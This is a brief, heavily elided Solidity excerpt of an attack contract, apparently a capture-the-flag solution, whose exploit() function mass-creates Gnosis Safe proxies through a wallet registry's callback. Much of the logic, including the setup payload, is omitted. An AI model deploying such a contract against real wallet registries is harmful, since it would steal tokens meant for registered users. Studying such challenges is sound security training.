...
contract AttackWalletRegistry {
    ...
    address public safeRegistry;
    address public token;

    constructor(address _owner, address _factory, address _masterCopy, address _safeRegistry, address _token) {
        owner = _owner;
        factory = _factory;
        masterCopy = _masterCopy;
        safeRegistry = _safeRegistry;
        token = _token;
    }
    ...
    function exploit(address[] memory users, bytes memory setupData) external {
        for (uint256 i = 0; i < users.length; i++) {
            ...
            GnosisSafeProxy newProxy = GnosisSafeProxyFactory(factory).createProxyWithCallback(
                masterCopy, initGnosis, 123, IProxyCreationCallback(safeRegistry)
            );
